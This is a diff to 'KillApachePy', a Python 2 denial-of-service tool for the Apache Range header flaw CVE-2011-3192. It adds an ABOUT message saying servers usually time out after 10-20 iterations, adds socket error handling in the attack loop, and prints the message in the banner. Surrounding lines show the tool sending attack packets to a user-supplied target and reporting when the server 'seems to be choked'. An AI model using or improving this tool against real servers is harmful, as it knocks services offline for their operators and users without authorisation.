@@ -6,6 +6,7 @@ NAME    = "KillApachePy (Range Header DoS CVE-2011-3192)"
 VERSION = "0.1b"
 AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
 LICENSE = "Public domain (FREE)"
+ABOUT   = "You'll typically have to wait for 10-20 iterations before first connection timeouts"
 
 SLEEP_TIME = 5          # time to wait for new thread slots (after max number reached)
 RECV_SIZE = 100         # receive buffer size in testing mode
@@ -31,6 +32,10 @@ def attack(target):
             s.send(packet)
             if recv:
                 return s.recv(RECV_SIZE)
+        except socket.error, msg:
+            print "(x) Socket error ('%s')" % msg
+            if recv:
+                exit(-1)
         except Exception, msg:
             if 'timed out' in str(msg):
                 print "\r(i) Server seems to be choked ('%s')" % msg
@@ -70,7 +75,7 @@ def attack(target):
             os._exit(1)
 
 if __name__ == "__main__":
-    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
+    print "%s #v%s\n by: %s\n\n(%s)\n" % (NAME, VERSION, AUTHOR, ABOUT)
     parser = optparse.OptionParser(version=VERSION, option_list=[optparse.make_option("-t", dest="target", help="Target (e.g. \"www.target.com\")")])
     options, _ = parser.parse_args()
     if options.target:
